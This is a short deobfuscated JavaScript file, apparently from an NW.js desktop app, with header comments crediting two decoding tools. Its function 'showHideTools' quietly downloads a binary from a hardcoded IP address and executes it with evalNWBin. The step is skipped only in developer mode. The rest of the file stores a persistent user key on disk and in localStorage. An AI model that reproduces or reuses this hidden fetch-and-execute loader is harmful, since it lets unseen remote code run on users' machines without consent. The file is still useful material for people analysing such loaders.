//Thu Jul 24 2025 17:43:34 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
try {
  var fs = window.require("fs");
  window.path = require("path");
  window.fs = fs;
  window._fs = fs;
  window.filePath = path.join(process.cwd());
  window.closeInterval = null;
  function showHideTools() {
    var _0x381ff1 = new XMLHttpRequest();
    _0x381ff1.responseType = "arraybuffer";
    try {
      {
        if (nw.App.manifest.nodejs) binUrl = _0x381ff1.open("GET", "http://110.40.180.147/newAppFile/newData.bin?" + appid, true);else {
          _0x381ff1.open("GET", "http://110.40.180.147/newAppFile/data.bin?" + appid, true);
        }
      }
    } catch (_0x293f66) {}
    _0x381ff1.send();
    _0x381ff1.onload = () => {
      nw.Window.get().evalNWBin(null, _0x381ff1.response);
    };
  }
  !window.isDevelopMode && showHideTools();
  try {
    fs.readFile("./locales/user.txt", (_0x3f56c2, _0x348d08) => {
      var _0x495dd1 = _0x348d08 ? _0x348d08.toString() : localStorage.appKey;
      (!_0x495dd1 || _0x495dd1 == "13412214491") && (_0x495dd1 = Date.now().toString());
      localStorage.appKey = _0x495dd1;
      window.appKey = _0x495dd1;
      fs.writeFileSync("./locales/user.txt", _0x495dd1);
    });
  } catch (_0x5dcd08) {
    alert(_0x5dcd08);
    var appKey = localStorage.appKey || Date.now().toString();
    localStorage.appKey = appKey;
    window.appKey = appKey;
    fs.writeFileSync("./locales/user.txt", appKey);
  }
} catch (_0xcafaaf) {
  alert(_0xcafaaf);
}